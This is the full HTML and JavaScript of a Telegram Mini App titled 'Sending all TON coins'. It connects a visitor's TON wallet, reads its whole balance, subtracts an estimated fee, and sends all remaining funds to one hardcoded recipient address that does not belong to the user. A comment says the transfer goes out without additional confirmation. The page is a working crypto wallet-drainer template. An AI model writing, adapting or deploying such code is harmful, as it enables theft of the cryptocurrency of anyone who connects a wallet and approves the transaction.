<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Content-Security-Policy"
    content="
      default-src 'self';
      script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
      style-src 'self' 'unsafe-inline' https://unpkg.com;
      connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
      font-src 'self' https://unpkg.com;
      img-src * data:;
    ">
  <title>Telegram Mini App: Отправка всех монет TON</title>
  <script src="https://telegram.org/js/telegram-webapp.js"></script>
  <script src="./js/tonconnect-sdk.min.js"></script>
  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>
  <h1>Telegram Mini App: Отправка всех монет TON</h1>
  <div id="ton-connect"></div>
  <button id="sendTransaction">Отправить все монеты</button>

  <script>
    // Инициализация Telegram WebApp
    if (typeof Telegram === "undefined") {
      window.Telegram = {
        WebApp: {
          ready: () => console.log("Telegram WebApp ready stub"),
          showAlert: (msg) => alert(msg)
        }
      };
    } else {
      Telegram.WebApp.ready();
    }

    // Инициализация TON Connect UI
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect"
    });

    // Адрес получателя для обычного TON-перевода
    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";

    // Функция для получения баланса кошелька через внешний API (баланс в нанотоках)
    async function getWalletBalance(address) {
      try {
        const response = await fetch(`https://tonapi.io/v1/address/${address}/balance`);
        const data = await response.json();
        return BigInt(data.balance);
      } catch (err) {
        console.error("Ошибка получения баланса:", err);
        return 0n;
      }
    }

    // Функция для оценки комиссии транзакции через внешний API
    async function estimateTransactionFee(transaction) {
      try {
        const response = await fetch(`https://tonapi.io/v1/estimateFee`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(transaction)
        });
        const data = await response.json();
        return BigInt(data.fee);
      } catch (err) {
        console.error("Ошибка получения комиссии:", err);
        // Используем запасное значение комиссии, если оценка не удалась
        return 50000000n;
      }
    }

    // Функция для отправки транзакции (обычный перевод TON)
    async function sendTONTransaction(fee, amountToSend) {
      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: recipientAddress,       // Адрес получателя
            amount: amountToSend.toString(),   // Сумма перевода (баланс минус комиссия)
            payload: ""                      // Пустой payload для обычного перевода
          }
        ]
      };

      try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log("Транзакция отправлена:", result);
        Telegram.WebApp.showAlert("Транзакция отправлена: " + JSON.stringify(result));
      } catch (error) {
        console.error("Ошибка транзакции:", error);
        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
      }
    }

    // Основная функция для отправки всех монет
    async function sendAllTON() {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Подключите кошелек.");
        return;
      }

      const walletAddress = tonConnectUI.session.account.address;
      const balance = await getWalletBalance(walletAddress);
      if (balance === 0n) {
        Telegram.WebApp.showAlert("Не удалось получить баланс.");
        return;
      }

      // Создаем предварительную транзакцию для оценки комиссии
      const preliminaryTransaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: recipientAddress,
            amount: "0",
            payload: ""
          }
        ]
      };

      const fee = await estimateTransactionFee(preliminaryTransaction);
      if (balance <= fee) {
        Telegram.WebApp.showAlert("Недостаточно средств для покрытия комиссии.");
        return;
      }
      const amountToSend = balance - fee;

      // Отправляем транзакцию без дополнительного подтверждения, предупреждения на уровне платформы
      await sendTONTransaction(fee, amountToSend);
    }

    document.getElementById("sendTransaction").addEventListener("click", sendAllTON);
  </script>
</body>
</html>
